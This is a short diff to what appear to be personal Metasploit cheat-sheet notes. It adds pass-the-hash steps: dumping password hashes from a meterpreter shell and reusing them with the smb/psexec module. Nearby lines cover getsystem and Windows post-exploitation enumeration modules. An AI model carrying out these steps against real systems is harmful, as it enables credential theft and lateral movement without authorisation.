@@ -11,6 +11,13 @@ set TARGET 1
 set payload 
 getsystem
 
+PASS THE HASH -
+get meterpreter shell
+hashdump
+/smb/psexec 
+set SMBPass to hash
+set SMBUser to user
+
 WINDOWS POST EXP -
 post/windows/gather/enum_shares
 post/windows/gather/enum_computers
